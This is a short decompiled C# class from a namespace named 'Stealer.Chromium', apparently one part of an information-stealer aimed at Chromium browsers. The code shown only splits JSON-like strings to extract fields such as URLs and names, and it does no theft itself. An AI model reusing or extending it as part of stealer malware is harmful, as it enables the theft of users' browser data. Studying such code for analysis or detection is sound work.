using System;
using System.Text.RegularExpressions;

namespace Stealer.Chromium
{
	// Token: 0x02000036 RID: 54
	internal sealed class Parser
	{
		// Token: 0x060000E7 RID: 231 RVA: 0x000081F0 File Offset: 0x000063F0
		public static string RemoveLatest(string data)
		{
			return Regex.Split(Regex.Split(data, "\",")[0], "\"")[0];
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x0000820B File Offset: 0x0000640B
		public static bool DetectTitle(string data)
		{
			return data.Contains("\"name");
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x00008218 File Offset: 0x00006418
		public static string Get(string data, int index)
		{
			string result;
			try
			{
				result = Parser.RemoveLatest(Regex.Split(data, Parser.separator)[index]);
			}
			catch (IndexOutOfRangeException)
			{
				result = "Failed to parse url";
			}
			return result;
		}

		// Token: 0x0400005F RID: 95
		public static string separator = "\": \"";
	}
}
